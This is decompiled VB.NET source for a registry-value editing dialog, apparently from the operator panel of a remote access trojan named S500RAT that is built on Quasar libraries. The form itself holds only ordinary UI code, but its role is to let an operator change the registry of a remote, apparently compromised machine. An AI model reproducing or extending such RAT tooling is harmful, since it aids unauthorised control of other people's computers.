Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Gry.Helper
Imports Microsoft.VisualBasic.CompilerServices
Imports Quasar.Common.Utilities

Namespace S500RAT
	' Token: 0x0200002B RID: 43
	<DesignerGenerated()>
	Public Partial Class FormRegValueEditString
		Inherits Form

		' Token: 0x17000344 RID: 836
		' (get) Token: 0x06000849 RID: 2121 RVA: 0x000446B0 File Offset: 0x000428B0
		' (set) Token: 0x0600084A RID: 2122 RVA: 0x000446BC File Offset: 0x000428BC
		Private Overridable Property okButton As Button
			<CompilerGenerated()>
			Get
				Return Me._okButton
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.OkButton_Click
				Dim okButton As Button = Me._okButton
				If okButton IsNot Nothing Then
					RemoveHandler okButton.Click, value2
				End If
				Me._okButton = value
				okButton = Me._okButton
				If okButton IsNot Nothing Then
					AddHandler okButton.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000345 RID: 837
		' (get) Token: 0x0600084B RID: 2123 RVA: 0x000446FF File Offset: 0x000428FF
		' (set) Token: 0x0600084C RID: 2124 RVA: 0x00044709 File Offset: 0x00042909
		Private Overridable Property label2 As Label

		' Token: 0x17000346 RID: 838
		' (get) Token: 0x0600084D RID: 2125 RVA: 0x00044712 File Offset: 0x00042912
		' (set) Token: 0x0600084E RID: 2126 RVA: 0x0004471C File Offset: 0x0004291C
		Private Overridable Property valueNameTxtBox As TextBox

		' Token: 0x17000347 RID: 839
		' (get) Token: 0x0600084F RID: 2127 RVA: 0x00044725 File Offset: 0x00042925
		' (set) Token: 0x06000850 RID: 2128 RVA: 0x0004472F File Offset: 0x0004292F
		Private Overridable Property valueDataTxtBox As TextBox

		' Token: 0x17000348 RID: 840
		' (get) Token: 0x06000851 RID: 2129 RVA: 0x00044738 File Offset: 0x00042938
		' (set) Token: 0x06000852 RID: 2130 RVA: 0x00044742 File Offset: 0x00042942
		Private Overridable Property label1 As Label

		' Token: 0x17000349 RID: 841
		' (get) Token: 0x06000853 RID: 2131 RVA: 0x0004474B File Offset: 0x0004294B
		' (set) Token: 0x06000854 RID: 2132 RVA: 0x00044758 File Offset: 0x00042958
		Private Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000855 RID: 2133 RVA: 0x0004479C File Offset: 0x0004299C
		Public Sub New(value As RegistrySeeker.RegValueData)
			AddHandler MyBase.Load, AddressOf Me.FormRegValueEditString_Load
			Me._value = value
			Me.InitializeComponent()
			Me.valueNameTxtBox.Text = RegValueHelper.GetName(value.Name)
			Me.valueDataTxtBox.Text = Quasar.Common.Utilities.ByteConverter.ToString(value.Data)
		End Sub

		' Token: 0x06000856 RID: 2134 RVA: 0x00044800 File Offset: 0x00042A00
		Private Sub OkButton_Click(sender As Object, e As EventArgs)
			Me._value.Data = Quasar.Common.Utilities.ByteConverter.GetBytes(Me.valueDataTxtBox.Text)
			MyBase.Tag = Me._value
			MyBase.DialogResult = DialogResult.OK
			MyBase.Close()
		End Sub

		' Token: 0x06000857 RID: 2135 RVA: 0x0004483B File Offset: 0x00042A3B
		Private Sub FormRegValueEditString_Load(sender As Object, e As EventArgs)
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000858 RID: 2136 RVA: 0x0004484B File Offset: 0x00042A4B
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x040003B3 RID: 947
		Private _value As RegistrySeeker.RegValueData
	End Class
End Namespace
